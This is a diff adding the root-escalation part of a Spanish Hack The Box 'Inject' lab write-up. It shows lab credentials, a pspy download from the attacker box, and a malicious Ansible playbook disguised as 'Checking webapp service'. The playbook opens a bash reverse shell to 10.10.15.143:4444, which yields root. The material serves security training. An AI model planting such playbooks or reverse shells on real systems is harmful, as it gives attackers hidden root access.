@@ -377,9 +377,77 @@ frank@inject:~/.m2$ cat settings.xml
 </settings>
 ```
 
-Probamos las credenciales `phil:DocPhillovestoInject123`.
+Probamos las credenciales `phil:DocPhillovestoInject123`:
 
+```bash
+phil@inject:/$ whoami
+phil
+phil@inject:~$ cat user.txt
+7388652ac9bd1af2c1a...
+```
 
-[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/513)
+Perfecto, ahora solo nos queda `root`. Usaremos [pspy](https://github.com/DominicBreuker/pspy) para enumerar procesos dentro de la máquina, vamos a transferir el script:
+
+```bash
+phil@inject:/$ cd /tmp                        
+phil@inject:/tmp$ wget http://10.10.15.143/pspy64
+--2026-06-10 18:42:31--  http://10.10.15.143/pspy64
+Connecting to 10.10.15.143:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64                         100%[=================================================>]   2.96M   221KB/s    in 24s     
+
+2026-06-10 18:42:58 (125 KB/s) - ‘pspy64’ saved [3104768/3104768]
+
+phil@inject:/tmp$ ls
+hsperfdata_frank
+pspy64
+systemd-private-58cc0182eab4407a89c57a73595c7944-ModemManager.service-z0h1Nf
+systemd-private-58cc0182eab4407a89c57a73595c7944-systemd-logind.service-Iv2fCf
+systemd-private-58cc0182eab4407a89c57a73595c7944-systemd-resolved.service-twHIqh
+systemd-private-58cc0182eab4407a89c57a73595c7944-systemd-timesyncd.service-7LOebg
+tomcat.8080.4470978649777964879
+tomcat-docbase.8080.17294993029515873417
+vmware-root_732-2999591876
+phil@inject:/tmp$ chmod +x pspy64
+```
+
+Ya estaría listo para ejecutar. Encontramos lo siguiente:
+
+```bash
+2026/06/10 18:46:01 CMD: UID=0     PID=1575   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml 
+2026/06/10 18:46:01 CMD: UID=0     PID=1571   | /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/ 
+```
+
+Encontramos **Ansible** una herramienta para automatizar tareas entre otros. Encontramos que `ansible-parallel` es un paquete de python usado para correr multiples playbooks en paralelo.
+
+El usuario **root** esta ejecutando todas las tareas dentro de `/opt/automation/tasks` con privilegios. Vamos a crear una tarea maliciosa:
+
+```bash title="playbook_2.yml"
+- hosts: localhost
+  tasks:
+  - name: Checking webapp service
+    shell: bash -c 'bash -i >& /dev/tcp/10.10.15.143/4444 0>&1'
+```
+
+Y lo guardamos en `/opt/automation/tasks` a la vez que nos ponemos a la escucha con `nc -lvnp 4444`:
+
+```bash
+❯ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.143] from (UNKNOWN) [10.129.228.213] 39206
+bash: cannot set terminal process group (4236): Inappropriate ioctl for device
+bash: no job control in this shell
+root@inject:/opt/automation/tasks# whoami
+whoami
+root
+root@inject:/opt/automation/tasks# cat /root/root.txt
+cat /root/root.txt
+3eeda3691bc6aeebc19...
+```
+
+[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/533)
 
 ---
